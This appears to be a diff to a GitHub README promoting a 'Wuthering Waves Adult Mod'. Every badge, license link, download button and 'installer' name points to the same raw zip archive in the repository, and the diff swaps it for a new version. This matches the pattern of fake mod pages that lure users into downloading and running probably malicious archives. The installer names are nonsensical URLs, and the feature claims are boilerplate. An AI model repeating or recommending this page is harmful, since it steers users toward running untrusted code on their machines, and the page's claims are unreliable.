@@ -1,15 +1,15 @@
 # Wuthering Waves Adult Mod 🔥
 
-![Release](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip)
-![Downloads](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip)
-![License](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip)
-![Maintained](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip)
+![Release](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip)
+![Downloads](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip)
+![License](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip)
+![Maintained](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip)
 
 Welcome to the **Wuthering Waves Adult Mod** – the definitive enhancement project for elevating your Wuthering Waves gaming odyssey to the next realm of engagement and personalization. Dynamic, adaptive, and engineered with cutting-edge algorithms, this mod harmoniously blends aesthetic transformation with a robust set of features tailored for discerning adult audiences.
 
 ---
 
-[![Download](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip%20Here-green?logo=download&style=for-the-badge)](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip)
+[![Download](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip%20Here-green?logo=download&style=for-the-badge)](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip)
 
 ---
 
@@ -21,10 +21,10 @@ Searching for an immersive, customizable, and secure **Wuthering Waves mod for a
 
 | Platform         | Supported Version          | Experience Level |
 |------------------|---------------------------|------------------|
-| ![Windows](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip%2F11-blue)      | 10, 11                  | 🌟🌟🌟🌟🌟           |
-| ![macOS](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip%2B-lightgrey)     | 10.15+ (Catalina+)      | 🌟🌟🌟🌟          |
-| ![Linux](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip%2018.04%2B-yellowgreen)      | Ubuntu 18.04+, Arch     | 🌟🌟🌟             |
-| ![Steam Deck](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip%20Deck-Experimental-purple)    | Experimental            | 🌟🌟               |
+| ![Windows](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip%2F11-blue)      | 10, 11                  | 🌟🌟🌟🌟🌟           |
+| ![macOS](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip%2B-lightgrey)     | 10.15+ (Catalina+)      | 🌟🌟🌟🌟          |
+| ![Linux](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip%2018.04%2B-yellowgreen)      | Ubuntu 18.04+, Arch     | 🌟🌟🌟             |
+| ![Steam Deck](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip%20Deck-Experimental-purple)    | Experimental            | 🌟🌟               |
 
 _Each compatibility level is regularly reviewed and refined for seamless synergy with your preferred operating system._
 
@@ -58,14 +58,14 @@ Before you set sail, please back up your existing *Wuthering Waves* installation
 
 **Ready to claim your personalized adventure?**
 
-[![Download](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip%20Here-green?logo=download&style=for-the-badge)](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip)
+[![Download](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip%20Here-green?logo=download&style=for-the-badge)](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip)
 
-Click the button above or here: https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip to initiate the download.
+Click the button above or here: https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip to initiate the download.
 
 ### Step 3: Install
 
 1. Unzip the downloaded archive to any temporary location.
-2. Run the included installer (`https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip` for PC, `https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip` for Mac, or `https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip` for Linux).
+2. Run the included installer (`https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip` for PC, `https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip` for Mac, or `https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip` for Linux).
 3. Follow the on-screen prompts. Choose any additional plugins or language packs to enrich your gameplay.
 4. Launch *Wuthering Waves* — your mod is ready! Activate new features via the *Mod Menu* in-game.
 
@@ -129,7 +129,7 @@ The Wuthering Waves Adult Mod invites you to join a *UniVerse* of unbridled arti
 
 This repository is licensed under the MIT License © 2025 — empowering you with flexibility, transparency, and collaborative freedom.
 
-[View the license here.](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip)
+[View the license here.](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip)
 
 ---
 
@@ -144,7 +144,7 @@ _Please ⭐ this repository to support innovation and join the next chapter in W
 
 ---
 
-[![Download](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip%20Here-green?logo=download&style=for-the-badge)](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/mature_waves_wuthering_enhancements_1.7.zip)
+[![Download](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip%20Here-green?logo=download&style=for-the-badge)](https://github.com/Donmandela/wuthering-waves-mature-enhancements/raw/refs/heads/branch/pamphleter/wuthering-mature-enhancements-waves-v3.8-alpha.3.zip)
 
 ---
 
